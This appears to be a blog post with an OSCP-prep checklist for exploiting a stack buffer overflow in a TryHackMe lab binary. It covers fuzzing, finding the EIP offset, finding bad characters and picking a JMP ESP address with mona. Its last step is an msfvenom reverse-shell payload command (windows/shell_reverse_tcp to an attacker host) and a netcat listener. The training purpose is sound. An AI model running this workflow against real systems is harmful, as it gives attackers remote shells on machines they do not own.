---
layout: post
title:  "Buffer Overflow Checklist"
date:   2021-01-21 20:07:19
categories: [Checklist,oscp-prep,BOF]
comments: true

---

I prepared these checklist from this Amazing THM Room. Thanks to the creator
https://tryhackme.com/room/bufferoverflowprep

<!--more-->

### Step 1 (Initial Set up):
 
* Run the immunity debugger as Administrator
* File --> Open --> "Load the BOF Binary"
* Debug --> Run/Restart
* Connect to the vulnerable bof from Kali linux and understand how the binary works
`nc <remotemachine> port`
* Configure Mona working directory to the current directory
`!mona config -set workingfolder c:\mona\%p`

### Step 2 (Fuzz)

* Run [fuzz.py](https://gist.githubusercontent.com/an0th3rhuman/1db2f50be783b9c9383d0e8ff0277dc1/raw/13b5e06ba50e06c4724569caaffdfeb8987fb525/fuzzer.py)

* When you see the `Could not connect to the Machine`, then note the largest byte sent.

### Step 3 (EIP Control):

* Create [exploit.py](https://gist.githubusercontent.com/an0th3rhuman/250866a7d0923603a4f96a4e14c6017d/raw/b1afe0b25c24c22d7c9277e953af130800da35ae/exploit.py)


* Create pattern, by giving 400 byte extra to the byte that we found during step2.
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
* Put output for the above in `payload` variable
* Rerun the debugger and execute exploit.py
* Once the application crash, execute the below command in mona to find EIP offset (give length as given in pattern create)
`!mona findmsp -distance 600`
* Update the offset variable
* Empty the payload variable
* Update retn value with BBBB
* Restart the binary and you will notice the value of B in EIP


### Step 4 (Finding Bad Characters):

* Create bytearray bin in Mona by excluding Bad characters. /x00 by default a bad character
`!mona bytearray -b "\x00"`
* Create [bytearray.py](https://gist.githubusercontent.com/an0th3rhuman/751236b8ed058efdc2f5ed92c1c8b7e6/raw/bd7174ca9a8f3bcbb9eee57370b8b54265f4b4a7/badchar.py)

* Set the result to the payload variable
* Restart the binary and run exploit.py
* Once crashed, execute the below to know further bad characters
`!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`
* Make note of bad characters, add to the bytearray bin and remove the badcharacters from the bytearray payload.
* Repeat the above process till get "Unmodified" while comparing with ESP address


### Step 5 (Finding Jump point)

* Update -cbp flag with all bad characters found from the step 4
`!mona jmp -r esp -cpb "\x00"`
* The above command return all the address of ESP that does not contain any bad characters
* Choose any ESP address and update it in reverse order in the retn Variable


### Step 6 (Generating Payload)

* `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py `
* Tweak the code by replacing payload to buf

* Set the padding 16 or more `padding = "\x90" * 16` in the exploit code
* Spwan a nc listner and run the exploit!




